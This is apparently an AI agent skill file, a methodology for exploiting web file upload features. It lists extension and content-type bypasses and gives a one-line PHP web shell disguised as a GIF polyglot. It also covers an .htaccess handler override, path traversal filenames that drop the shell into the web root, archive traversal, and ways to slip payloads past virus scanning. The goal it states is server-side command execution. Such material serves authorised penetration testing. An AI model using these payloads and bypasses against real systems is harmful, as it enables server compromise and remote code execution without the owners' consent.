---
name: file-upload-methodology
description: "File upload exploitation: bypassing extension and content filters, achieving code execution, and chaining with path traversal. Use this skill when an application accepts uploaded files."
---

# File Upload

## Overview

Upload is a two-part problem: get the file stored, then get it executed. Filters usually block the second.

## Bypass the extension filter

| Filter | Bypass |
|---|---|
| Blacklist `.php` | `.php5`, `.phtml`, `.phar`, `.php.jpg`, `.pHp` |
| Case-sensitive | `.PHP` |
| Trailing dot/space | `shell.php.`, `shell.php ` (Windows) |
| Double extension | `shell.jpg.php`, `shell.php.jpg` |
| Null byte (old) | `shell.php%00.jpg` |
| Content-type check | set `Content-Type: image/jpeg` |
| Magic bytes | prepend `GIF89a;` |

## Bypass content inspection

```bash
# polyglot: valid image + PHP
printf 'GIF89a;<?php system($_GET["c"]); ?>' > shell.gif.php
```

## .htaccess / web.config

If `.htaccess` upload is allowed:

```apache
AddType application/x-httpd-php .jpg
```

Then upload `shell.jpg` with PHP content.

## Path traversal in filename

```
filename="../../../../var/www/html/shell.php"
```

## Archive upload

- ZIP with a traversal path (`../../shell.php`) — many extractors follow it.
- Symlink in a tar.

## Where execution happens

| Location | Executes? |
|---|---|
| Web root, PHP MIME | yes |
| `uploads/` with no handler | no — need LFI or .htaccess |
| S3 bucket | no, unless served through a dynamic handler |
| Temp dir with predictable name | via LFI |

## Bypass server-side validation

- Image resizing: inject into EXIF, then use a second bug.
- Virus scan: obfuscate the payload, or split across two files.
- Sandbox: upload a benign file first, then the payload.

## Detection of the storage path

```bash
# response often leaks it
# or guess: /uploads/<uuid>.<ext>
```

## Pitfalls

- A successful upload with no execution path is a low-severity finding.
- Modern frameworks rename files to a UUID — traversal in the filename is ignored, but path traversal in a separate parameter may work.
- Content-Disposition and nosniff headers block HTML/JS execution in some browsers.

## Verification

Uploaded file must execute server-side (command output visible in the response).
